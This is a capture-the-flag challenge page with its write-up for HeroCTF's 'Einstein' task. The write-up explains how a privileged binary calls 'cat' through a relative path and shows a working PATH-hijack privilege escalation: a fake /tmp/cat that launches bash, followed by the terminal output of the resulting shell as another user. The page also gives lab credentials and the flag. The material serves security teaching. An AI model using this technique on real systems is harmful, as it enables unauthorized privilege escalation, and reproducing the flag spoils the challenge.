# Einstein

### Category

Misc

### Description

1. The laws of physics are the same for all observers in any inertial frame of reference relative to one another (principle of relativity).
2. The speed of light in vacuum is the same for all observers, regardless of their relative motion or of the motion of the light source.

Source: [https://en.wikipedia.org/wiki/Theory_of_relativity](https://en.wikipedia.org/wiki/Theory_of_relativity)

Credentials: `user:password`

> Deploy on [deploy.heroctf.fr](https://deploy.heroctf.fr/)

Format : **Hero{flag}**<br>
Author : **Log_s**

### Write Up

The `learn` binary essentially does two things :
1. Set the real and effective user id to the effective user id.
2. Read a file located in Einstein's home directory.

The important part to spot here, is the way the file is read. The `system` syscall is used with the relative path of `cat`. This means that the program will go through the `$PATH` environment variable to find the first matching binary. The correct way to write this would have been to call `/bin/cat` instead of `cat` (well actually, the correct way would have been to use `open` and `read` syscalls, but that's another story).

To exploit this, we can create our own `cat` executable, and make sure it is the first one in the `$PATH` environment variable.

```
user@einstein:~$ id
uid=1000(user) gid=1000(user) groups=1000(user),100(users)
user@einstein:~$ echo "bash" > /tmp/cat
user@einstein:~$ chmod +x /tmp/cat
user@einstein:~$ PATH=/tmp:$PATH ./learn
Welcome to this physics course! All information on this course is not copied from the internet without fact check and is completely riginal.

===================================

bash: /home/user/.bashrc: Permission denied
einstein@einstein:~$ id
uid=1001(einstein) gid=1000(user) groups=1000(user),100(users)
```

Here, we create a fake `cat` executable in `/tmp` that will execute `bash` instead. We then add the `/tmp` directory at the beginning of the `$PATH` environment variable, and run the `learn` binary. The `cat` binary will be found in `/tmp` before the real `cat` binary in `/bin`, and will execute `bash` instead.

PS: If you proceed like this, you will have to call `/bin/cat` to read the flag, since `cat` will execute `bash` instead.

### Flag

Hero{th30ry_of_r3l4tiv3_p4th5}